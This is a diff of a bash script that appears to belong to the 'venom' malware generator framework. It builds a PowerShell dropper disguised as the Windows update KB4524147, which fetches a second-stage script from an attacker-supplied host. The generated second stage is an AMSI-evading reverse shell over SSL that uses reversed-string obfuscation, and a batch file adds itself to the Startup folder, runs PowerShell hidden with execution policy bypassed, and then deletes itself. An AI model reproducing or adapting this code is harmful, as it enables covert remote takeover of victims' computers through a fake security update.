@@ -12008,6 +12008,8 @@ echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
 echo "---"
 sleep 2
 
+
+## Store User Inputs (bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
@@ -12045,6 +12047,7 @@ echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
 echo "#>" >> $IPATH/output/$Drop.ps1
 echo "" >> $IPATH/output/$Drop.ps1
 echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
+echo "write-Host \"Connecting to Remote Server To Download Updates ..\";" >> $IPATH/output/$Drop.ps1
 echo "   Get-HotFix;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
 echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
 echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
@@ -12060,7 +12063,6 @@ echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: @ZHacker13" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "write-Host \"Connecting to Remote Server To Download Updates ..\";" >> $IPATH/output/$NaM.ps1
 echo "\$MethodInvocation = \"gnidocnEiicsA.txeT.metsyS\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
 echo "\$NewObjectCommand = (\$Constructor -Join '');\$icmpv6 = \"StreamWriter\";\$assembly = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
 echo "\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
@@ -12105,7 +12107,6 @@ echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sl
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
 cd $IPATH
-
 
 
 ## Print attack vector on terminal
@@ -12166,6 +12167,8 @@ echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
 echo "---"
 sleep 2
 
+
+## Store User Inputs (bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
@@ -12239,7 +12242,6 @@ echo "   \$sendback2 = \$sendback + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/$NaM.ps1
 echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/$NaM.ps1
 echo "}" >> $IPATH/output/$NaM.ps1
-
 
 
 ## Generate SSL certificate openssl
@@ -12403,7 +12405,9 @@ else
    echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "echo echo Connecting to Remote Server To Download Updates .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo PoWeRsHeLl Get-HotFix >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
 fi
 
